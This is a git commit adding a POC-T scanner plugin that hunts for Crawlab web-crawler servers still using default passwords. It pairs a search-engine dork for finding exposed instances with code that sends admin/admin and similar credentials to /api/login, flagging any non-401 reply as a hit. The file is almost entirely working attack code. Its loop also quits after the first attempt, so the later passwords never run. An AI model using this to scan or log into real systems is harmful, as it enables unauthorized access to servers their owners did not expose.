7b9d3e12165678b2e83fafc75dca774a6ece1ca9
unc1e <root@zuoxueba.org>
2023-09-10 16:29:39 +0800

    feat: add Crawlab_weak_pass.py

---
+++ script/Crawlab_weak_pass.py
@@ -0,0 +1,43 @@
+#!/usr/bin/env python
+# -*- encoding: utf-8 -*-
+'''
+@File    :   Crawlab_weak_pass.py
+@Contact :   lihanwei@zhiqiansec.com
+@DateTime :  2023/9/10 16:00
+
+@Dork
+    title=="Crawlab | Distributed Web Crawler Platform"
+
+@Cmdline
+    python POC-T.py -s Crawlab_weak_pass.py -aF title=="Crawlab | Distributed Web Crawler Platform"
+
+
+@Request
+```
+POST /api/login
+
+{"username":"admin","password":"admin"}
+```
+
+@Expected Response
+    not 401
+'''
+
+from lib.utils.http import request_ex, get_http_url, urljoin_ex
+
+
+def poc(url):
+    url = urljoin_ex(url, "/api/login")
+    for pwd in [
+        "admin",
+        "123456",
+        "admin123"
+    ]:
+        resp = request_ex("post", url, json={"username": "admin", "password": pwd})
+        if resp and resp.status_code != 401:
+            return True
+        else:
+            break
+    # finally
+    return False
+
